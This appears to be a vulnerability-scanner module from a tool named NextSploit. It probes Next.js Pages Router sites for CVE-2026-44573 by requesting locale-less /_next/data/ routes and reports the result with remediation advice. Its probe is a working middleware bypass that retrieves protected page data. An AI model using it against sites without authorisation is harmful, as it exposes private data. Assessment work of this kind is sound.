#!/usr/bin/env python3
"""
NextSploit — CVE-2026-44573: Pages Router i18n Data-Route Middleware Bypass

Root Cause:
  In Next.js Pages Router apps with i18n enabled, requests to
  /_next/data/<buildId>/<page>.json without a locale prefix skip middleware,
  allowing unauthenticated access to protected page data endpoints.

Detection Strategy:
  1. Precondition: Pages Router (config.detected_router_type == "pages").
  2. Precondition: Build ID must be discovered (config.discovered_build_id).
  3. Version-based check.
  4. Active probe: locale-less data route vs locale-prefixed — compare responses.

Affected Versions:
  >= 13.0.0, < 15.5.16  (branch 15.x)
  >= 16.0.0, < 16.2.5   (branch 16.x)
Fixed In       : 15.5.16 / 16.2.5
Severity       : High
"""

import requests

from core.config import ScanConfig, CVE_DATABASE, check_vuln_status
from core.reporter import ModuleResult, Finding
from core.output import log_info, log_success, log_warning, log_debug, print_finding

CVE_ID   = "CVE-2026-44573"
CVE_INFO = CVE_DATABASE[CVE_ID]

# Common page routes to test
_PAGE_PROBES = ["index", "about", "home", "dashboard", "admin"]
# Common locale codes to try
_COMMON_LOCALES = ["en", "id", "fr", "de", "es", "pt", "ja", "ko", "zh"]


def _detect_locale_from_page(page_text: str) -> list:
    """Extract locale codes from HTML links."""
    import re
    found = re.findall(r'(?:href|src)=["\']/([a-z]{2}(?:-[A-Z]{2})?)/(?!_next)', page_text)
    return list(set(found))


def scan(config: ScanConfig) -> ModuleResult:
    result = ModuleResult(
        cve=CVE_ID,
        title=CVE_INFO["title"],
        severity=CVE_INFO["severity"],
        status="NOT VULNERABLE",
    )

    # Precondition: Pages Router
    if config.detected_router_type == "app":
        result.status = "NOT_APPLICABLE"
        log_info(f"[{CVE_ID}] App Router detected — skipping (Pages Router only).")
        return result

    session = config.create_session()
    target  = config.target.rstrip("/")

    log_info(f"Starting {CVE_ID} scan — Pages Router i18n data-route middleware bypass...")

    # Version check
    best_ver = config.version_state.best()
    version_detected = best_ver.value if best_ver else None
    version_vulnerable = False

    if version_detected:
        vuln_status = check_vuln_status(version_detected, CVE_ID)
        if vuln_status == "PATCHED":
            log_success(f"Version {version_detected} is patched for {CVE_ID}.")
            return result
        if vuln_status == "VULNERABLE":
            version_vulnerable = True
            log_warning(f"Version {version_detected} is in the vulnerable range.")

    # Precondition: Build ID
    build_id = config.discovered_build_id
    if not build_id:
        result.status = "INCONCLUSIVE"
        log_warning(f"[{CVE_ID}] No Build ID discovered — cannot probe data routes.")
        result.add_finding(Finding(
            cve=CVE_ID,
            severity=CVE_INFO["severity"],
            title="Pages Router i18n Bypass — Build ID Not Found",
            status="INCONCLUSIVE",
            detail="Build ID required to probe /_next/data/ routes. Run with --fingerprint first.",
            evidence={"version": version_detected or "unknown"},
            confidence=0.20,
        ))
        return result

    # Detect locales from main page
    try:
        r_main = session.get(target, timeout=config.timeout)
        detected_locales = _detect_locale_from_page(r_main.text)
    except requests.RequestException:
        detected_locales = []

    locales_to_try = detected_locales if detected_locales else _COMMON_LOCALES
    log_debug(f"Testing locales: {locales_to_try[:5]}")

    bypassed = False
    bypass_evidence = {}

    for page in _PAGE_PROBES:
        locale_url    = f"{target}/{locales_to_try[0]}/_next/data/{build_id}/{page}.json" if locales_to_try else None
        no_locale_url = f"{target}/_next/data/{build_id}/{page}.json"

        try:
            r_no_locale = session.get(no_locale_url, timeout=config.timeout, allow_redirects=False)
            log_debug(f"[{r_no_locale.status_code}] {no_locale_url}")

            # If we get a 200 or data JSON back without locale, middleware was bypassed
            if r_no_locale.status_code == 200 and "pageProps" in r_no_locale.text:
                bypassed = True
                bypass_evidence = {
                    "bypass_url": no_locale_url,
                    "status_code": r_no_locale.status_code,
                    "content_preview": r_no_locale.text[:300],
                    "detection": "locale-less data route returned page data (middleware skipped)",
                }

                # Report version signal if found in data response
                import re, json as _json
                try:
                    data = _json.loads(r_no_locale.text)
                    if "__N_SSP" in str(data) or "pageProps" in str(data):
                        log_debug("Valid pageProps data returned without locale — bypass confirmed.")
                except Exception:
                    pass

                break
        except requests.RequestException as e:
            log_debug(f"Probe error for {no_locale_url}: {e}")

    if bypassed and version_vulnerable:
        detail = (
            f"CONFIRMED: Next.js {version_detected} — locale-less data route "
            f"returned page data bypassing middleware."
        )
        confidence = 0.92
    elif bypassed:
        detail = (
            "Locale-less /_next/data/ route returned page data. "
            "Version unconfirmed — vulnerable if < 15.5.16 or < 16.2.5."
        )
        confidence = 0.65
    elif version_vulnerable:
        detail = (
            f"Version {version_detected} is in the vulnerable range. "
            "No direct bypass confirmed via data-route probe."
        )
        confidence = 0.40
    else:
        log_success(f"No {CVE_ID} bypass indicators detected.")
        return result

    bypass_evidence["detected_version"] = version_detected or "unknown"
    bypass_evidence["remediation"] = "Upgrade to Next.js 15.5.16+ (15.x) or 16.2.5+ (16.x)."

    log_warning(detail)
    print_finding(CVE_ID, detail, bypass_evidence)
    result.add_finding(Finding(
        cve=CVE_ID,
        severity=CVE_INFO["severity"],
        title="Pages Router i18n Data-Route Middleware Bypass",
        status="VULNERABLE",
        detail=detail,
        evidence=bypass_evidence,
        confidence=confidence,
    ))
    return result
